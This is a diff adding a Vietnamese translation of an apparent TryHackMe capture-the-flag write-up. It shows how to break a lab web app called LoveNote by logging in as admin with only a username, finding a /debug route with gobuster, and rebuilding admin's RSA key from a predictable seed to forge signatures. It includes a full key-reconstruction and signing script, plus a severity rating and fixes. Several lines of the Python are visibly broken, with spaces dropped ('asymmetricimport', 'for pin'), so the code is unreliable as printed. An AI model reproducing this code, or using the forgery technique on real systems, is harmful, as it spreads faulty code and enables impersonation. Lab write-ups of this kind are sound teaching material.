@@ -1,6 +1,6 @@
 ---
 title: 'Signed Messages'
-description: '[[THIẾU MÔ TẢ]]'
+description: 'Mỗi private key RSA của người dùng được sinh ra một cách xác định từ username, nên ta tái tạo khóa của admin, giả mạo chữ ký, và lấy flag.'
 date: 2026-10-05
 platform: tryhackme
 room: 'Signed Messages'
@@ -8,8 +8,186 @@ roomUrl: 'https://tryhackme.com/room/lafb2026e8'
 difficulty: medium
 tags: [web, crypto, rsa, signature forgery, authentication]
 vulnClasses: [Weak Cryptography, Predictable Key Generation, Authentication Bypass]
-translation: pending
-draft: true
+translation: done
+draft: false
 ---
 
-Bản dịch tiếng Việt đang được chuẩn bị. Đọc bản tiếng Anh.
+## TryHackMe: Signed Messages — Seed RSA đoán trước được phá vỡ mọi trái tim (và mọi chữ ký)
+
+_Lời giải thử thách web "Signed Messages" từ sự kiện Love at First Breach 2026 của TryHackMe. "LoveNote" cho bạn đăng nhập chỉ với một username, rồi ký các tin nhắn của bạn bằng một khóa RSA riêng cho từng người dùng. Cái bẫy: một trang debug lộ ra rằng private key của mọi người dùng được sinh ra một cách xác định từ username của họ — nên ta tái tạo lại private key của admin từ đầu, giả mạo một chữ ký, và lấy flag. Không cần phân tích thừa số (factoring) nào._
+
+> Flag đã được che. Đây là một thử thách luyện tập được phép trên TryHackMe; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập hợp pháp.
+
+---
+
+### TL;DR — toàn bộ chuỗi
+
+<Callout type="tldr">
+
+Web app "LoveNote" ở cổng 5000 → **đăng nhập chỉ cần một username** (xác thực hỏng), nên đăng nhập với tư cách `admin` → cookie session Flask giải mã ra `{"username":"admin"}` → quét nội dung đã-xác-thực lộ ra một route **`/debug`** → `/debug` làm lộ **thuật toán sinh khóa xác định**: private key RSA được seed hoàn toàn từ username (`{username}_lovenote_2026_valentine`) → **tái tạo private key của admin ở local**, ký tin nhắn yêu cầu bằng **RSA-PSS**, nộp chữ ký giả mạo → **flag**.
+
+Toàn bộ chủ đề crypto là một màn đánh lạc hướng: các khóa không mạnh, chúng chỉ _đoán trước được_.
+
+</Callout>
+
+### Mục tiêu
+
+```text
+export IP=<target-ip>
+```
+
+LoveNote là một app Flask ở cổng 5000 cho người dùng gửi các "thư tình" được ký bằng mật mã. Một chủ đề PKI/chữ ký đậm đặc thường có nghĩa là lỗi dự định nằm ở _cách_ crypto được thiết lập, không phải ở việc phá toán học trực diện.
+
+### Xác thực hỏng: đăng nhập bằng một username, không gì khác
+
+Điều lạ đầu tiên là chính việc đăng nhập. App nói:
+
+> "LoveNote dùng username của bạn để tải các khóa mật mã của bạn."
+
+**Không có ô mật khẩu** — bạn xác thực bằng cách tự xưng tên. Nên ta cứ đăng nhập với tư cách `admin`. Cookie session mặc định của Flask được ký nhưng **không mã hóa**, và giải base64 nó xác nhận server tin chính xác những gì ta gõ:
+
+```text
+session=eyJ1c2VybmFtZSI6ImFkbWluIn0.<sig>   ->   {"username":"admin"}
+```
+
+Ta là admin. Nhưng các tin nhắn hiển thị là dữ liệu mẫu — chưa có flag. Mục tiêu thật rõ ràng nằm trong bộ máy chữ ký, nên ta liệt kê những gì app đã-xác-thực phơi ra.
+
+### Liệt kê: một lần quét nội dung đã-xác-thực tìm ra `/debug`
+
+Chạy gobuster **với cookie session admin của ta** làm nổi lên các route mà một lần quét khi đã đăng xuất sẽ bỏ lỡ:
+
+```text
+gobuster dir -u http://$IP:5000/ -w /usr/share/wordlists/dirb/big.txt -t 100 \
+  -c "session=<admin-session-cookie>"
+```
+
+```text
+about        (200)
+compose      (200)
+dashboard    (200)
+debug        (200)   <-- interesting
+login        (200)
+logout       (302)
+messages     (200)
+register     (200)
+verify       (200)
+```
+
+Một endpoint **`/debug`** trên một app crypto chính xác là nơi bí mật rò rỉ.
+
+### Lỗ hổng: sinh khóa xác định
+
+`/debug` làm lộ cách LoveNote dựng cặp khóa RSA của mỗi người dùng — và nó hoàn toàn xác định từ username:
+
+```text
+seed = f"{username}_lovenote_2026_valentine"
+p    = next_prime( int(SHA256(seed))        )
+q    = next_prime( int(SHA256(seed + b"pki")) )
+n    = p * q
+e    = 65537
+```
+
+Đây là toàn bộ cuộc chơi. Bảo mật của RSA dựa trên việc private key _bí mật và không đoán trước được_. Ở đây private key là một hàm thuần của **username công khai** và một **hằng số ghi cứng** (`_lovenote_2026_valentine`). Bất kỳ ai biết một username đều có thể tính lại `p`, `q` của người dùng đó, và do đó số mũ riêng `d` — không cần factoring, không cần kênh phụ (side channel). (Các khóa cũng rất nhỏ — `n` khoảng 509-bit từ các PEM được xuất ra — nhưng ta thậm chí không cần điểm yếu đó; chỉ riêng tính đoán-trước-được đã là chí mạng.)
+
+Để xác nhận, app trao một cặp khóa cho một người dùng ta tạo, và OpenSSL cho thấy modulus/các số nguyên tố khớp với công thức:
+
+```text
+openssl rsa -in key.pem -text -noout          # private: 509-bit, 2 primes
+openssl rsa -pubin -in pubkey.pem -text -noout # public: same modulus, e=65537
+```
+
+### Khai thác: tái tạo khóa của admin và giả mạo chữ ký
+
+Vì private key là xác định, ta dựng lại khóa của **admin** ở local từ seed và ký bất kỳ tin nhắn nào thử thách yêu cầu. LoveNote xác minh bằng **RSA-PSS / SHA-256** (như trang `/about` của nó nêu), nên ta khớp cách padding đó:
+
+```text
+import hashlib, sys
+from cryptography.hazmat.primitives.asymmetricimport rsa, padding
+from cryptography.hazmat.primitivesimport hashes
+
+def is_prime(n):
+    if n< 2: return False
+    for pin [2,3,5,7,11,13,17,19,23,29,31,37]:
+        if n% p== 0: return n== p
+    d, r= n-1, 0
+    while d% 2 == 0: d//= 2; r+= 1
+    for ain [2,3,5,7,11,13,17,19,23,29,31,37]:
+        x= pow(a, d, n)
+        if xin (1, n-1): continue
+        for _in range(r-1):
+            x= x*x% n
+            if x== n-1: break
+        else: return False
+    return True
+
+def next_prime(x):
+    if x% 2 == 0: x+= 1
+    while not is_prime(x): x+= 2
+    return x
+
+def priv_for(username, e=65537):
+    seed= f"{username}_lovenote_2026_valentine".encode()
+    p= next_prime(int.from_bytes(hashlib.sha256(seed).digest(), 'big'))
+    q= next_prime(int.from_bytes(hashlib.sha256(seed+ b"pki").digest(), 'big'))
+    d= pow(e, -1, (p-1)*(q-1))
+    nums= rsa.RSAPrivateNumbers(p, q, d, d% (p-1), d% (q-1), pow(q, -1, p),
+                                 rsa.RSAPublicNumbers(e, p*q))
+    return nums.private_key()
+
+user, msg= sys.argv[1], sys.argv[2].encode()
+sig= priv_for(user).sign(
+    msg,
+    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
+    hashes.SHA256(),
+)
+print(sig.hex())
+```
+
+```text
+python3 forge.py admin "test"
+# -> 011992d1c599...<signature hex>
+```
+
+Nộp chữ ký giả mạo cho `admin` qua luồng verify/compose của app thì qua được xác minh — server kiểm nó với public key của admin, vốn là bạn đời của private key ta vừa dựng lại. LoveNote chấp nhận ta như một `admin` thật, nắm giữ khóa, và flag rơi ra:
+
+```text
+THM{<redacted>}
+```
+
+<Callout type="insight">
+
+**Bí mật đoán-trước-được thì không phải bí mật.** Dẫn xuất một private key từ một định danh công khai cộng một hằng số nghĩa là khóa "riêng tư" đó thực chất là kiến thức công khai được ngụy trang.
+
+</Callout>
+
+### Vì sao nó hoạt động
+
+- **Bí mật đoán-trước-được không phải bí mật.** Dẫn xuất một private key từ một định danh công khai cộng một hằng số nghĩa là khóa "riêng tư" đó là kiến thức công khai được ngụy trang.
+- **Đăng nhập chỉ-bằng-username không phải là xác thực.** Tin một cái tên mà không có bằng chứng sở hữu là một cú vượt danh tính thẳng tuột; ở đây nó còn tải sẵn ngữ cảnh khóa của nạn nhân cho bạn.
+- **Endpoint debug làm lộ của quý.** Một route `/debug` mô tả thuật toán khóa biến một thử thách crypto "khó" thành một bài tập chép-công-thức.
+
+### Mức độ nghiêm trọng
+
+<Callout type="critical">
+
+**Tới hạn.** Bất kỳ người dùng nào (hay khách ẩn danh có thể đăng ký/đăng nhập bằng tên) đều có thể mạo danh **bất kỳ** người dùng nào, kể cả `admin`, và giả mạo các chữ ký hợp lệ cho tin nhắn tùy ý — một cú phá vỡ hoàn toàn cả xác thực lẫn tính toàn vẹn của tin nhắn.
+
+</Callout>
+
+### Khuyến nghị khắc phục
+
+<Callout type="fix">
+
+1. **Sinh khóa từ một nguồn ngẫu nhiên an toàn về mật mã**, không bao giờ từ một username hay bất kỳ seed đoán-được nào, và dùng kích thước khóa hiện đại (RSA ≥ 2048-bit hoặc chuyển sang Ed25519). Lưu private key ở phía server, được bảo vệ, và không bao giờ phơi ra.
+2. **Yêu cầu xác thực thật** (mật khẩu/passkey/MFA) — một username là một định danh, không phải một thông tin đăng nhập (credential).
+3. **Gỡ các route debug/chẩn đoán khỏi production** và không bao giờ tiết lộ logic sinh khóa.
+
+</Callout>
+
+### Điểm rút ra
+
+- **Crypto trông đáng sợ thường là một màn đánh lạc hướng.** Đừng vội với tới factoring hay tấn công lattice trước khi kiểm tra _các khóa được tạo ra thế nào_. Tính đoán-trước-được thắng brute force.
+- **Được ký ≠ đáng tin.** Một chữ ký chỉ có ý nghĩa nếu khóa ký thật sự bí mật. Tái tạo khóa là bạn tái tạo người ký.
+- **Liệt kê sau xác thực rất quan trọng.** `/debug` chỉ hiện ra khi ta quét với một session hợp lệ — luôn liệt kê lại sau khi có quyền truy cập.
+
+Cảm ơn bạn đã đọc. "Signed Messages" xứng với tagline của sự kiện: seed đoán-trước-được thật sự làm tan vỡ trái tim — và mọi chữ ký phụ thuộc vào chúng.
